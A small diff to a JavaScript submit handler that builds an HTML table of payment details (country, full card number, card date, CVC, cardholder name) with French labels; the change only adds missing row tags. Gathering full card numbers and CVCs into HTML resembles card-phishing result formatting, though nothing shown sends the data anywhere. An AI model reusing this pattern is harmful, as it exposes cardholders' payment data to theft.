@@ -78,15 +78,19 @@ document.getElementById("btn-submit").addEventListener("click", function (e) {
             "          <th style=\"text-align: left\">Pays: </th>\n" +
             "          <td>" + pays + "</td>\n" +
             "      </tr>\n" +
+            "      <tr>\n" +
             "          <th style=\"text-align: left\">Numero de la carte: </th>\n" +
             "          <td>" + dcarte + "</td>\n" +
             "      </tr>\n" +
+            "      <tr>\n" +
             "          <th style=\"text-align: left\">Date de la carte: </th>\n" +
             "          <td>" + dcartedate + "</td>\n" +
             "      </tr>\n" +
+            "      <tr>\n" +
             "          <th style=\"text-align: left\">CVC: </th>\n" +
             "          <td>" + dcvc + "</td>\n" +
             "      </tr>\n" +
+            "      <tr>\n" +
             "          <th style=\"text-align: left\">Nom de la carte: </th>\n" +
             "          <td>" + dcartenom + "</td>\n" +
             "      </tr>\n" +
